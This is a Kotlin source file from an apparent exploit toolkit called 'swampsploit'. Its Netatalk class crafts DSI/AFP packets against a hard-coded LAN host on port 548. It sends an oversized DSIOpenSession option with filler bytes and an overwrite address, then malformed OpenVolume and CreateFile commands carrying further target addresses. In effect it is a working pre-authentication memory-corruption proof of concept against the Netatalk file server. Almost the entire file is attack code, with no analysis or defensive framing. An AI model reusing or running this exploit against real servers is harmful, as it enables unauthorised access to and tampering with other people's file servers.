package me.smoothhacker.swampsploit.exploit

import me.smoothhacker.swampsploit.utils.ExploitContext
import java.io.InputStream
import java.net.*
import java.util.*

@OptIn(ExperimentalUnsignedTypes::class)
class Netatalk constructor(
    private val ctx: ExploitContext,
    private val fileName: String = "PoC Demo",
) {
    val preauthSwitchAddress = ubyteArrayOf(64u, 49u, 101u, 0u, 0u, 0u, 0u, 0u) // 653140

    fun formatMalAFP(payload: UByteArray, address: UByteArray): UByteArray {
        val result = UByteArray(144)
        result[0] = 17u
        payload.copyInto(result, 2)
        address.copyInto(result, 136)
        return result
    }

    @ExperimentalUnsignedTypes
    class DSI constructor(var flag: UByte, var command: UByte, var requestId: UShort, var payload: UByteArray = ubyteArrayOf()) {
        constructor(flag: Flag, command: Command, requestId: UShort, payload: UByteArray = ubyteArrayOf()) : this(flag.value, command.value, requestId, payload)

        companion object {
            fun build(stream: InputStream): DSI {
                val flag = stream.read().toUByte()
                val command = stream.read().toUByte()
                val requestId = stream.read().toUByte().toUShort().rotateLeft(8).or(stream.read().toUByte().toUShort())
                for (i in 0 until 4) stream.read()
                var datasize: UInt = 0u
                for (i in 0 until 4) {
                    datasize = datasize.rotateLeft(8)
                    datasize = datasize.or(stream.read().toUByte().toUInt())
                }
                for (i in 0 until 4) stream.read()
                val payload = UByteArray(datasize.toInt())
                for (i in payload.indices) {
                    payload[i] = stream.read().toUByte()
                }
                return DSI(flag, command, requestId, payload)
            }
        }

        enum class Flag constructor(val value: UByte) {
            Request(0u),
            Reply(1u)
        }

        enum class Command constructor(val value: UByte) {
            DSICloseSession(1u),
            DSICommand(2u),
            DSIGetStatus(3u),
            DSIOpenSession(4u),
            DSITickle(5u),
            DSIWrite(6u),
            DSIAttention(8u)
        }

        val packet: UByteArray
            get() {
                /*
                if (payload.size < 4) {
                    val temp = UByteArray(4)
                    payload.copyInto(temp)
                    payload = temp
                }
                 */
                val result = UByteArray(16 + payload.size)

                result[0] = flag
                result[1] = command
                result[2] = requestId.rotateRight(8).toUByte()
                result[3] = requestId.toUByte()

                //val size = (payload.size - 4).toUInt()
                val size = payload.size.toUInt()
                for (i in 0 until 4) {
                    result[11 - i] = size.rotateLeft(i * 8).toUByte()
                }

                payload.copyInto(result, 16)
                return result
            }

        override fun toString(): String {
            return String(packet.toByteArray(), Charsets.UTF_8)
        }

    }

    fun exploit() {
        var response: DSI

        val client = Socket()
        client.soTimeout = 1000

        try {
            client.connect(InetSocketAddress("192.168.47.136", 548), 1000)
        } catch (e: Exception) {
            println("Failed to establish connection.")
        }

        val input = client.getInputStream()
        val output = client.getOutputStream()

        // initial exploit
        val exploit = UByteArray(18 + preauthSwitchAddress.size)
        ubyteArrayOf(
            1u, (exploit.size - 2).toUByte(),
            0u, 0u, 64u, 0u,
            0u, 0u, 0u, 0u,
            239u, 190u, 173u, 222u, // deadbeef
            206u, 250u, 237u, 254u, // feedface
        ).copyInto(exploit)
        preauthSwitchAddress.copyInto(exploit, 18)

        val dsi = DSI(DSI.Flag.Request, DSI.Command.DSIOpenSession, 1u, exploit)
        output.write(dsi.packet.toByteArray())

        response = DSI.build(input)

        val volumeName = "My AFP Volume"
        volumeName.toByteArray().toUByteArray()
        // open volume
        val ovp = UByteArray(3 + volumeName.length)
        ubyteArrayOf(0u, 32u, volumeName.length.toUByte()).copyInto(ovp)
        volumeName.toByteArray().toUByteArray().copyInto(ovp, 3)
        val openVolume = formatMalAFP(ovp, ubyteArrayOf(166u, 232u, 67u, 0u, 0u, 0u, 0u, 0u))

        output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, 2u, openVolume).packet.toByteArray())

        response = DSI.build(input)
        println(response.payload.contentToString())

        val cfp = UByteArray(8 + fileName.length)
        response.payload.copyInto(cfp, 0, 2, 4)
        println(cfp.toByteArray().contentToString())
        ubyteArrayOf(2u, 2u, fileName.length.toUByte()).copyInto(cfp, 5)
        fileName.toByteArray().toUByteArray().copyInto(cfp, 8)
        println(cfp.toByteArray().contentToString())
        val createFile = formatMalAFP(cfp, ubyteArrayOf(252u, 94u, 66u, 0u, 0u, 0u, 0u, 0u))

        output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, 3u, createFile).packet.toByteArray())

        response = DSI.build(input)
        println(response.payload.contentToString())

    }
}
